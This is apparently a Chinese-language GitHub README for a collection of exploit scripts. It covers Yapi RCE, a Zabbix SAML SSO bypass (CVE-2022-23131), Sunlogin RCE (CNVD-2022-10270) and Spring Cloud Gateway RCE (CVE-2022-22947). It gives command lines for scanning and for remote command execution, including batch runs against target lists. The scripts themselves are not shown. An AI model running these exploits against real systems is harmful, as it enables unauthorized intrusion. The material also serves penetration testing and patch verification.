# vuln_script
漏洞脚本

```
Yapi远程命令执行漏洞.py

```

## CVE-2022-23131 Zabbix SAML SSO认证绕过     CVE-2022-23131.py
```
python3 CVE-2022-23131.py -u http://127.0.0.1 -a Admin
```
![image](https://user-images.githubusercontent.com/33044636/156746852-69ffce94-4d5b-4cea-bfe5-688304ec08aa.png)



## 向日葵存在命令执行漏洞(CNVD-2022-10270)     sunlogin_rce.py

## poc
```
python3 sunlogin_rce.py --scan -u 10.108.3.74
```
![image](https://user-images.githubusercontent.com/33044636/162583279-56122224-ba29-4264-9acc-470be16c615a.png)

## rce
```
python3 sunlogin_rce.py --rce -u 10.108.3.74 -p 21021
```

![image](https://user-images.githubusercontent.com/33044636/162583376-53735402-e789-4822-a78a-c467013a63b3.png)



## Spring Cloud Gateway 远程代码执行漏洞       CVE-2022-22947.py

### 单个验证

具体的参数请看使用说明 `python3 CVE-2022-22947.py -h`

```
python3 CVE-2022-22947.py -u http://10.108.0.52:8080 -x whoami
```
![image](https://user-images.githubusercontent.com/33044636/156746308-40ff11ec-fdd1-4559-8d19-8bbc94a58ae0.png)


### 批量验证

```
python3 CVE-2022-22947.py -f url.txt
```
![image](https://user-images.githubusercontent.com/33044636/156746195-85182e7c-957f-49a5-b029-4c4e9ff6da28.png)
